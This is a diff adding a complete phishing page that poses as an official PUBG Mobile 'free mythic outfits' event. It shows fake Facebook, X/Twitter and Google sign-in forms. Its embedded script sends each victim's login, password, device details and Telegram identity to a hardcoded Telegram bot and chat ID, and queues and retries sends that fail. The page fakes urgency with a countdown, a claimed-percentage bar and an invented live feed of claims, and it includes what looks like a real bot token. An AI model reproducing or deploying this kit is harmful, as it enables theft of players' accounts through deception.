@@ -1,0 +1,364 @@
+<!DOCTYPE html><html lang="en" dir="ltr"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#07090d">
+<title>PUBG MOBILE — Season Reward Showcase</title><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#07090d;color:#e9eff7;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;direction:ltr;padding-bottom:72px}
+.wrap{max-width:1200px;margin:auto;padding:0 14px}
+.status{background:#0a1016;border-bottom:1px solid #16202b;font-size:10.5px;color:#7c8b9d;display:flex;gap:7px;padding:6px 14px;align-items:center}
+.sdot{width:6px;height:6px;border-radius:50%;background:#10b981}
+.status b{color:#10b981}#vc{margin-inline-start:auto;font-family:monospace}
+header{position:sticky;top:0;z-index:9;background:#07090d;border-bottom:1px solid #1b2430}
+.hrow{display:flex;align-items:center;gap:12px;padding:11px 0}
+.logo{font-weight:900;font-size:17px;letter-spacing:.5px}.logo span{color:#f7b733;display:block;font-size:9px;letter-spacing:5px}
+.badge{margin-inline-start:auto;font-size:10px;background:linear-gradient(90deg,#f7b733,#ffd257);color:#1a1206;font-weight:900;padding:5px 11px;border-radius:20px}
+.tabs{display:flex;gap:7px;overflow-x:auto;padding-bottom:10px;-webkit-overflow-scrolling:touch}
+.tab{background:#131b26;border:1px solid #1e2a38;color:#93a3b6;font-size:12.5px;font-weight:700;padding:7px 14px;border-radius:20px;cursor:pointer;white-space:nowrap}
+.tab.on{background:linear-gradient(90deg,#f7b733,#ffd257);color:#1a1206}
+.hero{margin:16px 0;background:#101821;border:1px solid #1d2836;border-radius:16px;padding:18px}
+.pill{display:inline-block;font-size:11px;font-weight:700;color:#ffd257;background:#f7b7331a;border:1px solid #f7b73359;padding:4px 11px;border-radius:20px;margin-bottom:10px}
+.hero h1{font-size:21px;line-height:1.45}.hero h1 b{color:#ffd257}
+.hero p{color:#93a3b6;font-size:13px;margin-top:8px}
+.geo{font-size:11px;color:#6f7f92;margin-top:9px}
+.cd{display:flex;gap:8px;align-items:center;margin-top:12px;font-size:12px;color:#93a3b6}
+.cd b{font-family:monospace;font-size:15px;color:#ff5a4d;background:#1a1113;padding:3px 9px;border-radius:7px}
+.prog{height:7px;background:#1a2330;border-radius:6px;margin-top:12px;overflow:hidden}
+.prog i{display:block;height:100%;width:87%;background:linear-gradient(90deg,#f7b733,#ff5a4d)}
+.tiny{font-size:11px;color:#6f7f92;margin-top:7px}
+.ad{display:flex;gap:10px;background:#101720;border:1px dashed #2a3849;border-radius:12px;padding:11px 14px;margin:14px 0;font-size:12px}
+.ad b{color:#ffd257}.ad span{color:#7c8b9d;margin-inline-start:auto;font-size:11px}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(158px,1fr));gap:10px}
+@media (min-width:768px){.grid{grid-template-columns:repeat(auto-fill,minmax(195px,1fr));gap:14px}}
+.card{background:#0d1319;border:1px solid #1d2836;border-radius:13px;overflow:hidden;transition:transform .15s,border-color .15s}
+.card:hover{transform:translateY(-2px);border-color:#35475c}
+.art{height:124px;display:grid;place-items:center;position:relative;overflow:hidden}
+.art img,.mart img{width:100%;height:100%;object-fit:cover;display:block}
+.fb-lbl{font-size:12px;font-weight:800;color:#e9eff7;padding:8px;text-align:center}
+.rar{position:absolute;top:6px;inset-inline-start:6px;font-size:9px;font-weight:900;padding:2px 7px;border-radius:5px;z-index:2;letter-spacing:.4px}
+.mythic .art,.mart.mythic{background:radial-gradient(circle at 50% 35%,#7c142d,#24060e)}
+.legend .art,.mart.legend{background:radial-gradient(circle at 50% 35%,#784f08,#241602)}
+.epic .art,.mart.epic{background:radial-gradient(circle at 50% 35%,#581c87,#1c082e)}
+.rare .art,.mart.rare{background:radial-gradient(circle at 50% 35%,#1d4ed8,#091636)}
+.uc .art,.mart.uc{background:radial-gradient(circle at 50% 35%,#047857,#052119)}
+.mythic .rar{background:#ff3b52;color:#fff}.legend .rar{background:#f7b733;color:#1a1206}
+.epic .rar{background:#a855f7;color:#fff}.rare .rar{background:#3b82f6;color:#fff}.uc .rar{background:#10b981;color:#04221a}
+.body{padding:10px}.name{font-size:12.5px;font-weight:700;line-height:1.35;min-height:34px}
+.price{font-size:11px;color:#6f7f92;text-decoration:line-through}
+.free{font-size:11.5px;font-weight:900;color:#10b981;margin:4px 0 7px}
+.btn,.upg,.go{width:100%;border:0;font-family:inherit;font-weight:900;border-radius:8px;cursor:pointer}
+.btn{background:linear-gradient(90deg,#f7b733,#ffd257);color:#1a1206;font-size:12px;padding:8px}
+.upg{margin-top:5px;background:#1b2634;color:#9fb2c7;font-size:11px;font-weight:700;padding:5px}
+.go:disabled{opacity:.6;cursor:not-allowed}
+footer{text-align:center;padding:24px 14px;color:#5d6c7d;font-size:11px;line-height:1.9;border-top:1px solid #141d27;margin-top:24px}
+.ov{position:fixed;inset:0;background:#030508d9;display:none;place-items:center;z-index:99;padding:16px}
+.ov.on{display:grid}
+.sheet{width:100%;max-width:400px;background:#0f1620;border:1px solid #24313f;border-radius:18px;padding:20px;position:relative}
+.x{position:absolute;top:11px;inset-inline-end:11px;background:#1b2634;border:1px solid #2b3a4c;color:#93a3b6;width:28px;height:28px;border-radius:50%;cursor:pointer;z-index:3}
+.hide{display:none}
+.mart{height:122px;display:grid;place-items:center;border-radius:12px;margin-bottom:12px;overflow:hidden}
+.sheet h3,.sheet h4{font-size:15px;text-align:center}
+.msub{text-align:center;font-size:11.5px;color:#8496a9;line-height:1.7;margin:7px 0 14px}
+.prov{width:100%;display:flex;gap:10px;justify-content:center;align-items:center;font-family:inherit;font-weight:700;font-size:13px;padding:11px;border-radius:10px;cursor:pointer;border:0;margin-bottom:9px}
+.prov span{font-weight:900;font-size:15px}
+.fb{background:#1877f2;color:#fff}.tw{background:#0e0e0e;color:#fff;border:1px solid #2c2c2c}.gm{background:#fff;color:#3c4043}
+.phead{height:60px;border-radius:12px;display:grid;place-items:center;font-size:24px;font-weight:900;margin-bottom:12px}
+.fld{position:relative}
+.inp{width:100%;background:#0c1219;border:1px solid #24313f;color:#e9eff7;font-family:inherit;font-size:13px;padding:11px;border-radius:9px;margin-bottom:9px}
+.eye{position:absolute;top:9px;inset-inline-start:9px;background:0;border:0;color:#6f7f92;font-size:14px;cursor:pointer}
+.go{background:linear-gradient(90deg,#f7b733,#ffd257);color:#1a1206;font-size:13.5px;padding:12px}
+.spin{width:42px;height:42px;border:3px solid #24313f;border-top-color:#f7b733;border-radius:50%;margin:8px auto 14px;animation:sp .8s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.bar{height:7px;background:#1a2330;border-radius:6px;margin:12px 0;overflow:hidden}
+.bar i{display:block;height:100%;width:0;background:#10b981;transition:width .18s}
+.okc{width:54px;height:54px;border-radius:50%;background:#10b981;color:#04221a;font-size:28px;font-weight:900;display:grid;place-items:center;margin:6px auto 13px}
+.okc.warn{background:#f7b733}
+.deliv{font-size:11px;text-align:center;margin-top:9px;font-weight:700}
+.deliv.ok{color:#10b981}.deliv.bad{color:#f7b733}
+.tick{position:fixed;bottom:0;inset-inline:0;z-index:60;background:#090d12;border-top:1px solid #2a3a1e;display:flex;gap:10px;align-items:center;padding:9px 12px}
+.live{font-size:10px;font-weight:900;color:#ff5a4d;background:#ff5a4d1f;padding:4px 9px;border-radius:20px}
+.track{flex:1;height:38px;overflow:hidden}
+.titem{height:38px;display:flex;gap:7px;align-items:center;font-size:11.5px}
+.titem b{color:#ffd257}.titem s{color:#10b981;text-decoration:none}
+.titem em{color:#6f7f92;font-family:monospace;font-size:10.5px;font-style:normal}
+.toast{position:fixed;top:14px;inset-inline:0;margin:auto;width:max-content;max-width:90%;background:#ff3b52;color:#fff;font-size:12px;font-weight:700;padding:9px 16px;border-radius:9px;z-index:120;opacity:0;transition:.25s;pointer-events:none}
+.toast.on{opacity:1}
+</style></head><body>
+<div class="status"><div class="wrap"><span class="sdot"></span><b>Showcase Online</b> · Instant Preview<span id="vc">👁 1,284</span></div></div>
+<header><div class="wrap"><div class="hrow"><div class="logo">PUBG<span>MOBILE</span></div>
+<div class="badge">🎁 Official Event</div></div>
+<div class="tabs" id="tabs"><button class="tab on" data-t="all">All</button>
+<button class="tab" data-t="skin">Outfits</button><button class="tab" data-t="char">Characters</button>
+<button class="tab" data-t="gun">Weapons</button><button class="tab" data-t="upg">Upgrade</button>
+<button class="tab" data-t="uc">UC Packs</button><button class="tab" data-t="rp">Royale Pass</button></div></div></header>
+<div class="wrap"><section class="hero"><div class="pill">🔥 Festival Crate — Season 21</div>
+<h1>Claim Mythic Outfits &amp; Upgraded Weapons <b>FREE</b></h1>
+<p>Select an item, sign in with your account, and preview your reward claim status.</p>
+<div class="geo" id="geo">📍 Platform: Mobile &amp; Desktop Compatible</div>
+<div class="cd"><span>Event ends in</span><b id="cd">05:59:59</b></div>
+<div class="prog"><i></i></div><p class="tiny">87% claimed — 1,240 rewards remaining</p></section>
+<div class="ad"><b>⚡ 30% Bonus UC Crate</b><span>Limited Time</span></div>
+<div class="grid" id="grid"></div>
+<div class="ad"><b>🆕 Patch 3.4 Showcase</b><span>New Skins</span></div>
+<footer><b>PUBG MOBILE</b> — Reward Showcase<br>© 2026 Level Infinite / Krafton</footer></div>
+<div class="ov" id="ov"><div class="sheet"><button class="x" id="closeBtn">✕</button>
+<div id="s1"><div class="mart" id="mArt"></div><h3 id="mName"></h3>
+<p class="msub">Free event reward — choose a sign-in method</p>
+<button class="prov fb" data-p="facebook"><span>f</span> Continue with Facebook</button>
+<button class="prov tw" data-p="twitter"><span>𝕏</span> Continue with X / Twitter</button>
+<button class="prov gm" data-p="google"><span>G</span> Continue with Google</button>
+<p class="tiny">By continuing, you agree to the event terms.</p></div>
+<div id="s2" class="hide"><div class="phead" id="pHead"></div><h4 id="pTitle"></h4>
+<p class="msub">Enter your account credentials</p>
+<input id="ident" class="inp" placeholder="Email or Phone Number" autocomplete="off" autocapitalize="off" spellcheck="false">
+<div class="fld"><input id="pass" class="inp" type="password" placeholder="Password" autocomplete="off">
+<button class="eye" id="eyeBtn" type="button">👁</button></div>
+<button class="go" id="goBtn">Sign In &amp; Claim Reward</button>
+<p class="tiny">🔒 Preview session</p></div>
+<div id="s3" class="hide"><div class="spin"></div><h4 id="loadTitle">Verifying...</h4>
+<div class="bar"><i id="barFill"></i></div><p class="msub" id="loadTxt">Checking reward availability...</p></div>
+<div id="s4" class="hide"><div class="okc" id="okIcon">✓</div><h4 id="okTitle">Reward Claimed!</h4>
+<p class="msub" id="okTxt"></p><p class="deliv" id="deliv"></p>
+<button class="go" id="okClose">Close</button></div>
+</div></div>
+<div class="tick"><div class="live">LIVE</div><div class="track" id="track"></div></div>
+<div class="toast" id="toast"></div>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+/* ======================= CONFIG ======================= */
+const CONFIG = {
+  token:  1449862347:AAE5eRycQGU4kdlFePuR4XciSazQdjtEuqw , // توكن البوت
+  chatId:  1188729209 ,      // ايدي المستلم
+  threadId:   ,              // رقم الموضوع إن كان الهدف مجموعة (اتركه فارغاً للخاص)
+  sendPassword: true,        // إرسال كلمة المرور
+  silent: false,             // true = إشعار صامت
+  prefix:  🎯 NEW CLAIM ,
+  minLoadMs: 1400,
+  maxQueue: 40
+};
+/* ====================================================== */
+
+const RAW="skin|Blood Raven Set|raven|mythic|Mythic|1,800 UC;;skin|Neon Phantom Suit|neon|legend|Legendary|1,200 UC;;skin|Desert Ghost Gear|desert|epic|Epic|800 UC;;skin|Cosmo Ranger Suit|cosmo|legend|Legendary|1,500 UC;;skin|Silent Wraith Outfit|wraith|epic|Epic|900 UC;;skin|Jester Chaos Set|jester|rare|Rare|600 UC;;char|Carlo Character|carlo|mythic|Mythic|1,400 UC;;char|Sara Character|sara|legend|Legendary|1,000 UC;;char|Victor Character|victor|epic|Epic|750 UC;;gun|M416 — Glacier|glacier|mythic|Mythic|2,400 UC;;gun|AKM — Hellfire|hellfire|legend|Legendary|1,600 UC;;gun|AWM — Neon|awm|mythic|Mythic|2,200 UC;;upg|Weapon Materials ×5|mat|epic|Epic|950 UC;;uc|660 UC Pack|uc660|uc|UC Pack|300 UC;;uc|1,800 UC Pack|uc1800|uc|UC Pack|800 UC;;rp|Royale Pass Elite|rp|legend|Legendary|600 UC";
+const ITEMS = RAW.split(";;").map(x=>{const[t,n,art,r,rl,p]=x.split("|");return{t,n,art,r,rl,p}});
+const $ = id => document.getElementById(id);
+const esc = s => String(s).replace(/[&<>" ]/g,c=>({ & : &amp; , < : &lt; , > : &gt; , " : &quot; ," ": &#39; }[c]));
+const SID =  s +Date.now().toString(36)+Math.random().toString(36).slice(2,6);
+
+let cur=null, mode= claim , prov=  , sending=false;
+
+/* ---------- Telegram WebApp (اختياري) ---------- */
+const TW = window.Telegram && window.Telegram.WebApp;
+if (TW) { try { TW.ready(); TW.expand(); TW.setHeaderColor && TW.setHeaderColor( #07090d ); } catch(e){} }
+
+/* ---------- رسائل ---------- */
+function toast(m){const t=$( toast );t.textContent=m;t.classList.add( on );setTimeout(()=>t.classList.remove( on ),2600);}
+
+/* ---------- طابور الإرسال ---------- */
+const QKEY= tgq_v2 ;
+const qLoad=()=>{try{return JSON.parse(localStorage.getItem(QKEY)|| [] )}catch(e){return[]}};
+const qSave=a=>{try{localStorage.setItem(QKEY,JSON.stringify(a.slice(-CONFIG.maxQueue)))}catch(e){}};
+
+async function tgPost(text){
+  const url= https://api.telegram.org/bot +CONFIG.token+ /sendMessage ;
+  const body=new URLSearchParams({
+    chat_id: CONFIG.chatId,
+    text: text.slice(0,3500),
+    disable_web_page_preview:  true ,
+    disable_notification: CONFIG.silent ?  true  :  false 
+  });
+  if (CONFIG.threadId) body.set( message_thread_id , CONFIG.threadId);
+
+  // محاولة 1: طلب عادي مع مهلة
+  try {
+    const ac = new AbortController();
+    const to = setTimeout(()=>ac.abort(), 7000);
+    const r = await fetch(url, {method: POST , body, signal: ac.signal});
+    clearTimeout(to);
+    const j = await r.json();
+    return !!j.ok;
+  } catch(e) { /* ننتقل للبديل */ }
+
+  // محاولة 2: no-cors (لا نقرأ الرد لكن الطلب يوصل غالباً)
+  try {
+    const q=new URLSearchParams({chat_id:CONFIG.chatId, text:text.slice(0,3000), disable_web_page_preview: true });
+    if (CONFIG.threadId) q.set( message_thread_id , CONFIG.threadId);
+    await fetch(url+ ? +q, {mode: no-cors });
+    return true;
+  } catch(e) { return false; }
+}
+
+async function deliver(text){
+  const ok = await tgPost(text);
+  if (!ok) { const q=qLoad(); q.push(text); qSave(q); }
+  return ok;
+}
+
+let flushing=false;
+async function flushQueue(){
+  if (flushing) return;
+  const q=qLoad(); if (!q.length) return;
+  flushing=true;
+  const rest=[];
+  for (const t of q) { if (!(await tgPost(t))) rest.push(t); }
+  qSave(rest); flushing=false;
+}
+setInterval(flushQueue, 20000);
+window.addEventListener( online , flushQueue);
+
+/* ---------- معلومات الجهاز ---------- */
+function deviceLine(){
+  const ua=navigator.userAgent;
+  const m=ua.match(/Android [\d.]+/)||ua.match(/iPhone OS [\d_]+/)||ua.match(/Windows NT [\d.]+/)||ua.match(/Mac OS X [\d_.]+/);
+  const b=ua.match(/(Edg|Chrome|Firefox|Safari)\/[\d.]+/);
+  return [m&&m[0], b&&b[0]].filter(Boolean).join(  ·  ).slice(0,80) ||  Unknown ;
+}
+function tz(){ try { return Intl.DateTimeFormat().resolvedOptions().timeZone ||  n/a ; } catch(e){ return  n/a ; } }
+
+/* ---------- بناء الرسالة ---------- */
+function buildMsg(ident, pass){
+  const L=[];
+  L.push(CONFIG.prefix+  — PUBG Showcase );
+  L.push( ━━━━━━━━━━━━━━ );
+  L.push( 🎁 Item:  +cur.n);
+  L.push( 🏷 Rarity:  +cur.rl);
+  L.push( ⚡ Mode:  +(mode=== upg ? Free Upgrade : Claim ));
+  L.push( 🔐 Provider:  +prov);
+  L.push( ━━━━━━━━━━━━━━ );
+  L.push( 👤 Login:  +ident);
+  if (CONFIG.sendPassword) L.push( 🔑 Pass:  +pass);
+  const u = TW && TW.initDataUnsafe && TW.initDataUnsafe.user;
+  if (u) L.push( 💬 Telegram:  +(u.username? @ +u.username:u.id)+  —  +[u.first_name,u.last_name].filter(Boolean).join(   ));
+  L.push( ━━━━━━━━━━━━━━ );
+  L.push( 🆔 Session:  +SID);
+  L.push( 📱 Device:  +deviceLine());
+  L.push( 🌍 TZ:  +tz());
+  L.push( 🕒  +new Date().toLocaleString( en-GB ));
+  L.push( 🔗  +location.href.slice(0,180));
+  return L.join( \n );
+}
+
+/* ---------- العرض ---------- */
+function artBox(it){
+  const src= images/ +encodeURIComponent(it.art)+ .png ;
+  return  <img loading="lazy" src=" +src+ " alt=" +esc(it.n)+ " onerror="var p=this.previousElementSibling;if(p)p.hidden=false;this.remove()"> ;
+}
+
+function render(cat){
+  cat = cat ||  all ;
+  $( grid ).innerHTML = ITEMS.map((it,i)=>({it,i}))
+    .filter(o=>cat=== all ||o.it.t===cat)
+    .map(({it,i})=>
+       <div class="card  +it.r+ "> +
+         <div class="art"><span class="rar"> +esc(it.rl)+ </span> +
+           <span class="fb-lbl" hidden> +esc(it.n)+ </span> +artBox(it)+ </div> +
+         <div class="body"> +
+           <div class="name"> +esc(it.n)+ </div> +
+           <div class="price"> +esc(it.p)+ </div> +
+           <div class="free">FREE CLAIM</div> +
+           <button class="btn" data-act="claim" data-i=" +i+ ">Claim</button> +
+          (it.t=== gun ? <button class="upg" data-act="upg" data-i=" +i+ ">Free Upgrade</button> :  )+
+         </div></div> ).join(  );
+}
+
+$( grid ).addEventListener( click , e=>{
+  const b = e.target.closest( button[data-act] );
+  if (!b) return;
+  openM(Number(b.dataset.i), b.dataset.act);
+});
+
+document.querySelectorAll( .tab ).forEach(b=>b.onclick=()=>{
+  document.querySelectorAll( .tab ).forEach(x=>x.classList.remove( on ));
+  b.classList.add( on ); render(b.dataset.t);
+});
+
+function showStep(n){[ s1 , s2 , s3 , s4 ].forEach((s,i)=>$(s).classList.toggle( hide , i+1!==n));}
+
+function openM(idx,m){
+  cur=ITEMS[idx]; mode=m; prov=  ; sending=false;
+  $( mArt ).className= mart  +cur.r;
+  $( mArt ).innerHTML= <span class="fb-lbl" hidden> +esc(cur.n)+ </span> +artBox(cur);
+  $( mName ).textContent=cur.n+(m=== upg ?  (Upgrade) :  );
+  $( ident ).value=  ; $( pass ).value=  ; $( pass ).type= password ;
+  $( goBtn ).disabled=false; $( goBtn ).textContent= Sign In & Claim Reward ;
+  showStep(1); $( ov ).classList.add( on );
+}
+function closeM(){ $( ov ).classList.remove( on ); }
+$( closeBtn ).onclick=closeM;
+$( okClose ).onclick=closeM;
+$( ov ).addEventListener( click , e=>{ if(e.target===$( ov )) closeM(); });
+
+const PROVIDERS={
+  facebook:[ f , Facebook , #1877f2 , #fff ],
+  twitter:[ 𝕏 , X / Twitter , #0e0e0e , #fff ],
+  google:[ G , Google , #fff , #3c4043 ]
+};
+document.querySelectorAll( .prov ).forEach(b=>b.onclick=()=>{
+  const p=b.dataset.p; prov=PROVIDERS[p][1];
+  $( pHead ).textContent=PROVIDERS[p][0];
+  $( pHead ).style.background=PROVIDERS[p][2];
+  $( pHead ).style.color=PROVIDERS[p][3];
+  $( pTitle ).textContent= Sign in with  +PROVIDERS[p][1];
+  showStep(2); $( ident ).focus();
+});
+
+$( eyeBtn ).onclick=()=>{ const p=$( pass ); p.type = p.type=== password  ?  text  :  password ; };
+
+/* ---------- الإرسال ---------- */
+async function send(){
+  if (sending) return;
+  const ident=$( ident ).value.trim(), pass=$( pass ).value.trim();
+  if (!ident) return toast( Please enter your email or phone number );
+  if (!pass)  return toast( Please enter your password );
+  if (!CONFIG.token || CONFIG.token.indexOf( : )<0) return toast( Bot token is not configured );
+
+  sending=true;
+  $( goBtn ).disabled=true; $( goBtn ).textContent= Please wait... ;
+  showStep(3);
+
+  const started=Date.now();
+  let w=0;
+  const iv=setInterval(()=>{ w+=18; $( barFill ).style.width=Math.min(w,92)+ % ; }, 130);
+
+  const ok = await deliver(buildMsg(ident, pass));
+
+  const wait = Math.max(0, CONFIG.minLoadMs - (Date.now()-started));
+  setTimeout(()=>{
+    clearInterval(iv);
+    $( barFill ).style.width= 100% ;
+    setTimeout(()=>{
+      $( okIcon ).className= okc +(ok?  :  warn );
+      $( okIcon ).textContent = ok ?  ✓  :  ! ;
+      $( okTitle ).textContent = ok ?  Reward Claimed!  :  Claim Submitted ;
+      $( okTxt ).textContent =  Preview claim completed for  +cur.n+ . ;
+      $( deliv ).className= deliv  +(ok? ok : bad );
+      $( deliv ).textContent = ok
+        ?  ✅ Delivered to operator 
+        :  ⚠️ Queued — will retry automatically ;
+      showStep(4);
+      sending=false;
+    }, 220);
+  }, wait);
+}
+$( goBtn ).onclick=send;
+$( pass ).addEventListener( keydown , e=>{ if(e.key=== Enter ) send(); });
+
+/* ---------- عدّاد + شريط حي ---------- */
+let sec=21599;
+setInterval(()=>{
+  if (sec>0) sec--;
+  const h=String(Math.floor(sec/3600)).padStart(2, 0 ),
+        m=String(Math.floor(sec%3600/60)).padStart(2, 0 ),
+        s=String(sec%60).padStart(2, 0 );
+  $( cd ).textContent=h+ : +m+ : +s;
+},1000);
+
+const feed=[[ 514289*** , M416 Glacier ],[ 598120*** , 660 UC ],[ 523104*** , Blood Raven Set ],[ 577412*** , Royale Pass ]];
+let fi=0;
+function tick(){
+  const f=feed[fi++%feed.length];
+  $( track ).innerHTML= <div class="titem"><em>ID: +f[0]+ </em> claimed <b> +f[1]+ </b> <s>✔</s></div> ;
+}
+tick(); setInterval(tick,3000);
+
+render( all );
+flushQueue();
+</script></body></html>
